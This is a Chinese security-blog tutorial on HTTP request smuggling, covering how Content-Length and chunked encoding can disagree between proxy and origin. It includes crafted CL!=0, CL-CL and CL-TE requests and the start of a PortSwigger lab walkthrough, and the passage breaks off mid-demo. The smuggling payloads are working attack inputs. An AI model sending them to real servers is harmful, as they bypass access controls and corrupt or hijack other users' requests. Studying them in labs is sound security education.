{"title":"初探HTTP请求走私","uid":"b78771140557d7dad4bcf7d70597ef1a","slug":"初探HTTP请求走私","date":"2022-11-02T17:41:30.000Z","updated":"2023-03-14T07:09:12.000Z","comments":true,"path":"api/articles/初探HTTP请求走私.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141509209.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于跳跳糖社区<a href=\"https://tttang.com/archive/1808/\">https://tttang.com/archive/1808/</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p><code>ISCC2022[让我康康]</code>这道赛题在接触时令我记忆犹新，之前由于学习知识其他也一直没有对HTTP请求走私进行相关学习，最近学习过后简单总结如下，希望能对正在学习HTTP请求走私的师傅有所帮助。</p>\n<h1 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Content-Length</p></blockquote>\n<p><code>Content-Length</code>指的是HTTP消息长度, 它使用十进制的数字表示了消息的长度, 服务器通过它来得知后续要读取消息的长度。<code>Content-Length</code>首部指出报文中实体主体的字节大小. 这个大小是包含了所有内容编码的，比如，对文本文件进行了gzip压缩，那它的大小就是压缩后的大小而非之前的。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Keep-alive</p></blockquote>\n<p>这个的话就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，其作用是告诉服务器接受完信息后，不要关闭TCP连接，后续对相同目标服务器的请求，一律采用这个TCP连接。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>pipline</p></blockquote>\n<p>其含义是新建一个TCP链接，有这个之后，客户端无需等待服务端的响应，就可以发送多次请求，单说可能不太好理解，可以结合下面这个图来进行理解</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Transfer-Encoding</p></blockquote>\n<p>它的含义是传输编码。<br>在最新的 HTTP 规范里，只定义了一种传输编码：<code>分块编码（chunked）</code>。<br>当使用分块编码的时候，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的<code> CRLF（\\r\\n）</code>，也不包括分块数据结尾的<code> CRLF</code>。最后一个分块长度值必须为<code> 0</code>，对应的分块数据没有内容，表示实体结束。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149118.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"HTTP请求走私\"><a href=\"#HTTP请求走私\" class=\"headerlink\" title=\"HTTP请求走私\"></a>HTTP请求走私</h1><p>下方示例的靶场均来自于<code>portswig</code>靶场，链接如下<br><a href=\"https://portswigger.net/web-security/all-labs\">https://portswigger.net/web-security/all-labs</a></p>\n<h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><p>一些网站为了优化用户体验，提高访问速度，采用了CDN加速服务，而最简单的加速方式是在原站点加上一个具有缓存功能的反向代理服务器，这个时候用户可以直接从代理服务器处取得资源，图示如下(图片来源于<a href=\"https://paper.seebug.org/1048/#3\">https://paper.seebug.org/1048</a>)<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149078.png\" alt=\"在这里插入图片描述\"><br>这个时候如果客户端传入一个恶意的请求数据，前端服务器（代理服务器）可能认为没问题，就传给了后端，而后端服务器（原站）在理解时，只认为一部分是正常请求，而另一部分请求就是走私的请求，他会对第二个请求造成影响，此时也就造成了HTTP走私攻击。</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><p>HTTP请求走私的危害有以下几个方面</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、它使攻击者可以绕过安全控制访问到本该被禁止访问的界面，可能会导致信息泄露\n<span class=\"token number\">2</span>、在特定情况下可以构造<span class=\"token constant\">XSS</span>语句，对其他用户和网页端造成一定影响\n<span class=\"token number\">3</span>、它可以实现未经授权访问敏感数据并直接危害其他应用程序用户。\n<span class=\"token number\">4</span>、在特定情况下可以窃取用户请求，获取到用户的cookie等敏感信息<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><h3 id=\"CL-0\"><a href=\"#CL-0\" class=\"headerlink\" title=\"CL!=0\"></a>CL!=0</h3><p>现有条件如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>代理服务器允许GET请求携带请求体，而原站不允许GET请求携带请求体</p></blockquote>\n<p>此时如果我们传入携带请求体的GET请求，就会出现一种情况，就是此时它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p>\n<p>我们构造请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">44</span>\\r\\n\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>secret <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时代理服务器收到请求，认为这个是正常的，传给后端服务器，而后端服务器不对这个<code>Content-Length</code>进行处理，此时因为存在<code>pipline</code>，他就会认为是两个单独的请求。<br>第一个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>第二个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>secret <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时就出现了请求走私。</p>\n<h3 id=\"CL-CL\"><a href=\"#CL-CL\" class=\"headerlink\" title=\"CL-CL\"></a>CL-CL</h3><p>按照<code>RFC7230</code>中的规定，当服务器遇见一个请求中包含两个<code>Content-Length</code>时，应该返回400错误，但一些服务器可能不会严格执行该规范，此时就可能出现请求走私。</p>\n<p>假设现有场景如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>前端代理服务器和后端服务器在收到一个包含两个<code>Content-Length</code>的请求时，皆不返回400，且此时前端代理服务器采用的是第一个<code>Content-Length</code>，后端服务器采用的是第二个<code>Content-Length</code></p></blockquote>\n<p>此时我们构造请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">8</span>\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">7</span>\\r\\n\n\n<span class=\"token number\">12345</span>\\r\\n\na<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>前端代理服务器：接收的是<code>Content-Length: 8\\r\\n</code>，他检查的时候，看的是六七行（第五行是POST传数据需要空一行，不计算其长度），<code>12345</code>+<code>\\n</code>+<code>a</code>=8，此时正好八个字符，所以他认为这个请求没有问题，传向后端服务器。</p>\n<p>后端服务器：接收的是<code>Content-Length: 7\\r\\n</code>，他检查的时候，看的同样也是五六七行，此时因为出现了8个字符，而他只接收7个，所以<code>a</code>还停留在缓冲区，后端服务器会认为他是下一个请求的一部分。</p>\n<p>若此时有一个请求</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>html <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>基于前端服务器和后端服务器是重用TCP连接的，此时<code>a</code>就会和请求相结合，组成一个新的请求</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">aGET <span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>html <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时客户就会收到<code>aGET request method not found</code>的错误回显，这就实现了一次请求走私攻击，并对正常客户造成了影响。</p>\n<h3 id=\"CL-TE\"><a href=\"#CL-TE\" class=\"headerlink\" title=\"CL-TE\"></a>CL-TE</h3><p>所指情况如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>前端采用的是<code>Content-Length</code><br>后端采用的是<code>Transfer-Encoding</code></p></blockquote>\n<p>现有请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n\nConnection<span class=\"token punctuation\">:</span> keep<span class=\"token operator\">-</span>alive\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">6</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n\na<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>前端服务器:接收的是<code>Content-Length: 6\\r\\n</code>，看代码的7-9行，<code>0</code>+<code>\\n</code>+<code>\\n</code>+<code>a</code>=6，此时前端认为没有问题，就会传向后端服务器(第六行是POST传数据需要空出一行，所以不计算其长度)</p>\n<p>后端服务器:接收的是<code>Transfer-Encoding: chunked\\r\\n</code>，他在处理第七行（结束标志）时，值是<code>0</code>，他会认为是接收内容结束，此时其后的<code>a</code>还停留在缓冲区。</p>\n<p>若此时有一请求</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>与<code>CL-CL</code>相似，此时<code>a</code>会与这一请求相结合变成一个新的请求</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">aPOST <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> example<span class=\"token operator\">.</span>com\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时客户端就会收到<code>Unrecognized method aPOST</code>的错误回显信息，这个时候就造成了请求走私攻击。</p>\n<h4 id=\"靶场演示\"><a href=\"#靶场演示\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h4><p>靶场链接<a href=\"https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te\">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a><br>打开环境后抓包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149327.png\" alt=\"在这里插入图片描述\"><br>接下来右键修改请求方法为POST<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149083.png\" alt=\"在这里插入图片描述\"><br>然后添加我们添加恶意代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">6</span>\\r\\n\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\\r\\n\n\\r\\n\n<span class=\"token number\">0</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">G</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149181.png\" alt=\"在这里插入图片描述\"><br>此时第一次发包，回显正常，这是因为它是正常CL阶段，读取6个字符，<code>0</code>+<code>\\n</code>+<code>\\n</code>+<code>a</code>=6,所以回显正常，接下来再发一次包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149169.png\" 